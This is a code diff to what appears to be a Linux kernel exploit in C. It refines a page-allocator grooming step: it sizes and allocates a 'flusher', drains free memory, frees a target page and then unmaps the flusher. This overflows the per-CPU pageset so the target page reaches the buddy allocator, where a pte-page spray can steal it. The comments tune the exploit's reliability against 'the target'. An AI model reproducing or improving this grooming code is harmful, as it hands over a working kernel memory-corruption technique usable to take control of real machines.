@@ -82,7 +82,9 @@ watermark. See groom_params() below.
 
 /* grooming plan, computed at runtime from /proc/meminfo */
 struct groom {
-	long floor_kb;   /* stop the incremental prefill when MemAvailable hits this */
+	long   floor_kb;   /* stop the incremental prefill when MemAvailable hits this */
+	size_t flush_mb;   /* flusher size: freed to overflow the movable pcp `high`
+			      and deterministically drain X (oldest entry) pcp->buddy */
 };
 
 void *maps[MAP_COUNT];
@@ -174,9 +176,20 @@ static struct groom groom_params(void) {
 	long high_pages = max_pcp_high_pages();
 	long floor_kb = (long)HEADROOM_MB * 1024;
 
-	printf("meminfo: total %zu MB, pcp high %ld pages -> prefill floor %ld MB free\n",
-	       total_mb, high_pages, floor_kb / 1024);
-	return (struct groom){ .floor_kb = floor_kb };
+	/* Flusher must exceed the movable pcp `high` at *free* time, and `high`
+	 * inflates several-fold under the fill load (we've seen it jump from ~2600
+	 * to ~5400 pages). Size it at 4x the (lightly-loaded) high read here, so it
+	 * still clears the inflated watermark, clamped to a sane MB range. The
+	 * competing movable free it adds is fine now: we spray to OOM and scan every
+	 * map, so we grind past it and still catch X. */
+	size_t high_mb = high_pages > 0 ? (size_t)high_pages * 4 / 1024 : 8;
+	size_t flush_mb = high_mb * 4;
+	if (flush_mb < 32) flush_mb = 32;
+	if (flush_mb > 96) flush_mb = 96;
+
+	printf("meminfo: total %zu MB, pcp high %ld pages -> prefill floor %ld MB free, "
+	       "flush %zu MB\n", total_mb, high_pages, floor_kb / 1024, flush_mb);
+	return (struct groom){ .floor_kb = floor_kb, .flush_mb = flush_mb };
 }
 
 /* memfd of MEMFD_SIZE filled with `magic` at every page start */
@@ -304,6 +317,19 @@ int main()
 		       "breaking the groom. Consider `swapoff -a` on the target.\n",
 		       swap_total / 1024);
 
+	/* Flusher, allocated BEFORE the fill (while memory is plentiful) so it fits;
+	 * freed right after punching X to overflow the movable pcp `high` and
+	 * deterministically drain X (the oldest pcp entry) into the buddy allocator.
+	 * We can't rely on the slow-path drain_all_pages() alone -- that's a race and
+	 * left X stuck on the pcp on ~2/3 of runs. */
+	size_t flush = g.flush_mb * ONE_MB;
+	char *flusher = mmap(NULL, flush, PROT_READ | PROT_WRITE,
+			     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+	if (flusher == MAP_FAILED) { perror("flusher"); return -1; }
+	madvise(flusher, flush, MADV_NOHUGEPAGE);
+	for (size_t o = 0; o < flush; o += FOUR_KB) flusher[o] = 1;
+	printf("allocated %zu MB flusher\n", g.flush_mb);
+
 	/* Big filler exhausts movable free (STAYS mapped). Fill in small chunks and
 	 * watch live MemAvailable so we drain down to the floor WITHOUT tripping the
 	 * OOM killer -- a single up-front allocation sized from MemAvailable
@@ -332,16 +358,13 @@ int main()
 	}
 	printf("freed X\n");
 
-	/* X is now on the movable per-CPU pageset. We deliberately do NOT free an
-	 * explicit "flusher" to overflow the pcp `high` watermark: under load `high`
-	 * inflates to ~20 MB, so the flusher would dump ~28 MB of freed movable
-	 * pages back as high-order blocks -- and the fallback steals every one of
-	 * those before it ever reaches the isolated order-0 X. Instead we rely on the
-	 * spray below: allocating pte-pages against a nearly-empty zone drives the
-	 * allocator slow path, which calls drain_all_pages() and spills X pcp->buddy
-	 * WITHOUT adding any competing movable free. With the fill having drained the
-	 * high-order movable blocks, X is then ~the only movable free block, so the
-	 * first fallback steal takes it. */
+	/* Overflow the movable pcp `high` -> free_pcppages_bulk drains the list from
+	 * the tail (oldest first), and X was just freed so it IS the oldest movable
+	 * entry -> X lands on the buddy movable freelist, where the unmovable fallback
+	 * can steal it. The big filler stays mapped, so the only competing movable
+	 * free is the flusher's own drained pages, which the spray-to-OOM grinds
+	 * through before reaching X (every-map scan catches it the moment it lands). */
+	munmap(flusher, flush);
 
 	/* Spray budget: vm.max_map_count is an upper VMA bound, but it is NOT the
 	 * terminating constraint -- on this target it's 1048576, so a runaway spray
